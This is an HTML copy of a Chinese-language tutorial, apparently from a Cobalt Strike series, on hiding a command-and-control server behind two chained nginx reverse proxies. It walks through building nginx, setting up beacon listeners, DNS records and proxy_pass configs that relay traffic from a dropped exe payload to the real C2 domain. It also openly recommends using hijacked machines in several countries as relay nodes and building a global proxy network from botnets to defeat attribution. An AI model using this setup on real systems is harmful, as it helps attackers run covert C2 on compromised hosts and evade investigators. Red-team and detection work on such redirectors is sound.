<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="尝试将-c2-隐匿于多级-nginx-反向代理"><span class="csECDA2D3">尝试将</span><span class="csDE05BCC"> C2 </span><span class="csECDA2D3">隐匿于多级</span><span class="csDE05BCC"> nginx </span><span class="csECDA2D3">反向代理</span></a></h1>
		<h2 class="cs868C439D">
			<a name="关于利用多级-nginx-反代实现-beacon-上线的大致思路拓扑"><span class="cs83F14626">关于利用多级</span><span class="csB2D98684"> nginx </span><span class="cs83F14626">反代实现</span><span class="csB2D98684"> beacon </span><span class="cs83F14626">上线的大致思路拓扑</span></a></h2>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image0.png" width="560" height="274" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">大致思路是这样</span><span class="cs8926E06">,</span><span class="cs9C1B1871">首先</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们会用一个</span><span class="cs8926E06"> CS </span><span class="cs9C1B1871">的外部</span><span class="cs8926E06"> http </span><span class="cs9C1B1871">监听器先把流量弹到第一层的</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代理节点上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为事先已经在</span><span class="cs8926E06"> mail </span><span class="cs9C1B1871">这台机器上做好了反代配置</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而这个反代配置里实际指向的是我们第二层</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点的域名</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以当回连的流量一过来就会直接被抛到第二层的</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">由于又事先在第二层反代节点上也做好了反代配置</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不过这次配置里指向的并不是别的地方</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而是我们真实的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">服务器域名</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以最终导致的结果就是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">目标机器回连流量在通过众多的</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点之后正常上线</span><span class="cs8926E06">,</span><span class="cs9C1B1871">大家自己实际操作过程中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">务必要先对着拓扑理解清楚再动手</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不然你可能会觉得有些乱</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实</span><span class="cs8926E06">,</span><span class="cs9C1B1871">说实话</span><span class="cs8926E06">,</span><span class="cs9C1B1871">没啥技术含量</span><span class="cs8926E06">,</span><span class="cs9C1B1871">完全都是些基础的堆砌加灵活应用而已</span><span class="cs8926E06">,</span><span class="cs9C1B1871">来看实际操作吧</span></p><h3 class="cs868C439D">
			<a name="X64689dc6d1183027ef3a945266e8cb9b590eda8"><span class="csD1E291E2">0x01 </span><span class="csD6CA00D2">首先</span><span class="csD1E291E2">,</span><span class="csD6CA00D2">同时在两台</span><span class="csD1E291E2"> nginx </span><span class="csD6CA00D2">反代节点的</span><span class="csD1E291E2"> vps </span><span class="csD6CA00D2">机器上编译安装好</span><span class="csD1E291E2"> nginx,</span><span class="csD6CA00D2">过程非常简单</span><span class="csD1E291E2">,</span><span class="csD6CA00D2">如下</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># apt-get install build-essential libtool libpcre3 libpcre3-dev zlib1g-dev openssl -y</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># useradd -s /sbin/nologin -M nginx </span><span class="cs7FFD2630">切记不要以高权限起服务</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># wget http://nginx.org/download/nginx-1.14.1.tar.gz</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># tar xf nginx-1.14.1.tar.gz</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># cd nginx-1.14.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ./configure --prefix=/usr/local/nginx-1.14.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module --with-http_gzip_static_module</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># make &amp;&amp; make install</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># echo $?</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image1.png" width="560" height="122" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image2.png" width="560" height="182" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X2c704f4d94e4a52211f9123d2a869ee57f2e763"><span class="csD1E291E2">0x02 </span><span class="csD6CA00D2">接着</span><span class="csD1E291E2">,</span><span class="csD6CA00D2">再回到自己本地的</span><span class="csD1E291E2"> linux </span><span class="csD6CA00D2">机器上</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">启动</span><span class="cs8926E06"> CobalStrike </span><span class="cs9C1B1871">客户端</span><span class="cs8926E06">,</span><span class="cs9C1B1871">连到自己的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">服务器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">然后创建两个</span><span class="cs8926E06"> </span><span class="cs9C1B1871">常规</span><span class="cs8926E06"> HTTP </span><span class="cs9C1B1871">协议</span><span class="cs8926E06">,</span><span class="cs9C1B1871">端口为</span><span class="cs8926E06"> 80 [ </span><span class="cs9C1B1871">注</span><span class="cs8926E06">: </span><span class="cs9C1B1871">两个监听器的协议必须匹配</span><span class="cs8926E06"> ] </span><span class="cs9C1B1871">的监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">一个就是反向监听器</span><span class="cs8926E06"> [ </span><span class="cs9C1B1871">特别注意下这个反连域名</span><span class="cs8926E06">,</span><span class="cs9C1B1871">是真正的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">服务器域名</span><span class="cs8926E06">,</span><span class="cs9C1B1871">即</span><span class="cs8926E06"> oa.finalc2.com,</span><span class="cs9C1B1871">也就是等会儿要从第二层</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点往后抛的域名</span><span class="cs8926E06"> ]</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image3.png" width="560" height="116" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外再创建一个相同协议端口的外部监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">注意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这个外部监听器的回连域名要写第一层</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点的域名</span><span class="cs8926E06">[ </span><span class="cs9C1B1871">即</span><span class="cs8926E06"> mail.first.com ],</span><span class="cs9C1B1871">因为回连的流量会首先被弹到这里</span><span class="cs8926E06">,</span><span class="cs9C1B1871">然后再通过层层反代直至抛到后端真实的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">服务器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">最后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">再用这个外部监听器创建一个</span><span class="cs8926E06"> exe payload,</span><span class="cs9C1B1871">等会儿要把它丢到目标机器执行</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image4.png" width="560" height="156" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">如下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">两个监听器准备就绪</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image5.png" width="560" height="59" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X8562aabdab1f59c3abdd2f34eee723ecf71ca24"><span class="csD1E291E2">0x03 </span><span class="csD6CA00D2">由于此处全程都是用域名在操作</span><span class="csD1E291E2">,</span><span class="csD6CA00D2">所以务必请提前配置好所有域名解析</span><span class="csD1E291E2">,</span><span class="csD6CA00D2">只需添加一条对应的</span><span class="csD1E291E2"> A </span><span class="csD6CA00D2">记录</span><span class="csD1E291E2"> </span><span class="csD6CA00D2">即可</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">mail.first.com 21.67.38.47</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image6.png" width="560" height="109" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">host.second.com 187.50.112.135</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image7.png" width="560" height="137" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">oa.finalc2.com 208.36.69.66</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image8.png" width="560" height="116" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X7115100a3f76da2f9d5503bc496bd70fbba8d78"><span class="csD1E291E2">0x04 </span><span class="csD6CA00D2">开始配置第一层</span><span class="csD1E291E2"> nginx </span><span class="csD6CA00D2">反代节点</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">也就是在</span><span class="cs8926E06"> 21.67.38.47 </span><span class="cs9C1B1871">这台机器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">配置过程非常简单</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234"># vi /usr/local/nginx/conf/nginx.conf</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">worker_processes 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">events {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> worker_connections 1024;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> include mime.types;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> default_type application/octet-stream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> sendfile on;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> keepalive_timeout 65;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> log_format main &#39;$remote_addr - $remote_user [$time_local] &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &#39; &quot;$request&quot; $status $body_bytes_sent &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &#39; &quot;$http_referer&quot; &quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot; &#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> upstream default_pools{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> server host.second.com:80; </span><span class="cs7FFD2630">到达本机的所有</span><span class="cs9FB05234"> 80 </span><span class="cs7FFD2630">端口的流量都会被后抛到这个域名上</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> server {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> listen 80;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> server_name host.second.com;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> location / {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> proxy_pass http://default_pools;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">配置完成后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">务必要记得立即重启</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">服务使配置生效</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ifconfig | grep &#39;inet addr&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># /usr/local/nginx/sbin/nginx -s quit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># /usr/local/nginx/sbin/nginx</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image9.png" width="560" height="391" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X24d5beff9234171baadc8440df70ccec88ef389"><span class="csD1E291E2">0x05 </span><span class="csD6CA00D2">开始配置第二层</span><span class="csD1E291E2"> nginx </span><span class="csD6CA00D2">反代节点</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">也就是在</span><span class="cs8926E06"> 187.50.112.135 </span><span class="cs9C1B1871">这台机器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">过程基本同上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">只不过这次是把流量直接抛给了后端的真实</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">服务器</span></p><p class="cs3A447A38"><span class="cs9FB05234"># vi /usr/local/nginx/conf/nginx.conf</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">worker_processes 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">events {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> worker_connections 1024;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> include mime.types;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> default_type application/octet-stream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> sendfile on;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> keepalive_timeout 65;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> log_format main &#39;$remote_addr - $remote_user [$time_local] &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &#39; &quot;$request&quot; $status $body_bytes_sent &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &#39; &quot;$http_referer&quot; &quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot; &#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> upstream default_pools{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> server oa.finalc2.com:80; </span><span class="cs7FFD2630">真实</span><span class="cs9FB05234"> C2 </span><span class="cs7FFD2630">域名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> server {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> listen 80;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> server_name oa.finalc2.com;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> location / {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> proxy_pass http://default_pools;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">之后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">同样务必要记得立即重启</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">服务使配置生效</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image10.png" width="560" height="439" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">此时</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当我们回到目标机器上正常执行</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">便会看到</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">正常上线</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">从目标机器的网络连接中也不难发现</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这个连接显示的</span><span class="cs8926E06"> ip </span><span class="cs9C1B1871">也只是我们上面第一层</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点的</span><span class="cs8926E06">ip,</span><span class="cs9C1B1871">而真实的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">服务器却被隐藏在了后端好几层</span><span class="cs8926E06">,</span><span class="cs9C1B1871">再加上如果中间的</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点全部都是直接拿不同国家地域的肉鸡搞的</span><span class="cs8926E06">[</span><span class="cs9C1B1871">高度匿名化</span><span class="cs8926E06">],</span><span class="cs9C1B1871">这无疑再一次加大了对方的溯源难度和成本</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image11.png" width="560" height="163" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">另外</span><span class="cs8926E06">,</span><span class="cs9C1B1871">从</span><span class="cs8926E06"> CS web log </span><span class="cs9C1B1871">里我们也清晰的看到</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所有请求都是从</span><span class="cs8926E06"> 187.50.112.135 [</span><span class="cs9C1B1871">即</span><span class="cs8926E06"> host.second.com </span><span class="cs9C1B1871">第二层</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代节点</span><span class="cs8926E06"> ]</span><span class="cs9C1B1871">这台机器过来的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">至此</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也说明我们的多级反代确实是成功有效的</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_C2_Profile/%e5%b0%9d%e8%af%95%e5%b0%86%20C2%20%e9%9a%90%e5%8c%bf%e4%ba%8e%e5%a4%9a%e7%ba%a7%20nginx%20%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86_files/image12.png" width="560" height="94" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="小结"><span class="cs83F14626">小结</span><span class="csB2D98684">:</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">至此为止</span><span class="cs8926E06">,</span><span class="cs9C1B1871">关于如何利用多级</span><span class="cs8926E06"> nginx </span><span class="cs9C1B1871">反代</span><span class="cs8926E06">,</span><span class="cs9C1B1871">来实现</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">的深度隐藏基本也就说完了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">多次实战检验</span><span class="cs8926E06">,</span><span class="cs9C1B1871">传输确实挺稳定的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">说实话</span><span class="cs8926E06">,</span><span class="cs9C1B1871">没太多技术含量</span><span class="cs8926E06">,</span><span class="cs9C1B1871">还是那句话</span><span class="cs8926E06">,</span><span class="cs9C1B1871">都是些非常简单的基础配合利用</span><span class="cs8926E06">,</span><span class="cs9C1B1871">文章初衷也是为了给弟兄们提供一个简单易用的</span><span class="cs8926E06"> demo,</span><span class="cs9C1B1871">其实</span><span class="cs8926E06">,</span><span class="cs9C1B1871">在实战中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你完全可以把这个搞的非常的复杂</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">利用一些比较稳定的肉鸡群做成一个非常庞大的全球反代网</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这些就要靠弟兄们自己思考了</span><span class="cs8926E06">,ok,</span><span class="cs9C1B1871">再多的就不说了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实话说到这儿</span><span class="cs8926E06">,</span><span class="cs9C1B1871">理解的弟兄</span><span class="cs8926E06">,</span><span class="cs9C1B1871">应该也都早已经理解了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不过退一步来讲</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这样隐藏</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">其实还是不够彻底</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为</span><span class="cs8926E06">,</span><span class="cs9C1B1871">毕竟我们此时的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">还是直接被暴露在公网中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">既然是在公网</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那就肯定有被扫到或者反捅的风险</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你的</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">直接用的</span><span class="cs8926E06"> CobaltStrike </span><span class="cs9C1B1871">这种东西来搞的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">万一哪天</span><span class="cs8926E06"> CS </span><span class="cs9C1B1871">再爆洞</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你可能又是第一批受害者</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">...</span><span class="cs9C1B1871">弟兄们应该都能理解了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">在下个章节中我们将会简单介绍</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如何用避免直接把</span><span class="cs8926E06"> C2 </span><span class="cs9C1B1871">暴露在公网中的方式去隐藏</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并实现本地</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">上线</span><span class="cs8926E06">,ok,</span><span class="cs9C1B1871">废话不多讲</span><span class="cs8926E06">,</span><span class="cs9C1B1871">有任何问题</span><span class="cs8926E06">,</span><span class="cs9C1B1871">弟兄们及时反馈</span><span class="cs8926E06">,</span><span class="cs9C1B1871">同时也非常欢迎大家来一起深</span></p></body>
</html>
